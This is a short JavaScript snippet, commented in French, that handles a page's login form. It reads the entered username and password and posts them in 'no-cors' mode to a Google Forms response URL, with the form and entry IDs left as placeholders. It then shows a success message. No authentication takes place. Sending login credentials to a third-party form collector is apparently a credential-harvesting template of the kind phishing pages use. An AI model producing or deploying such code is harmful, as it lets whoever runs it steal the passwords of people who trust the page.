const form = document.getElementById("loginForm");
form.addEventListener("submit", function (e) {
  e.preventDefault(); // Empêcher le rechargement de la page

  const formData = new FormData(form);
  const data = {
    // Remplacez 'entry.XXXXXX' par les identifiants appropriés de votre formulaire Google
    username: formData.get("username"),
    password: formData.get("password"),
  };

  // URL de votre Google Form
  const googleFormUrl =
    "https://docs.google.com/forms/d/e/YOUR_FORM_ID/formResponse";

  const params = new URLSearchParams();
  params.append("entry.XXXXXX", data.username); // Remplacez 'entry.XXXXXX' par le champ correspondant
  params.append("entry.YYYYYY", data.password); // Remplacez 'entry.YYYYYY' par le champ correspondant

  fetch(googleFormUrl, {
    method: "POST",
    mode: "no-cors", // Indiquez le mode no-cors
    body: params,
  })
    .then(() => {
      alert("Formulaire soumis avec succès!");
      form.reset(); // Réinitialiser le formulaire
    })
    .catch((error) => {
      console.error("Erreur:", error);
      alert("Une erreur s'est produite lors de la soumission.");
    });
});
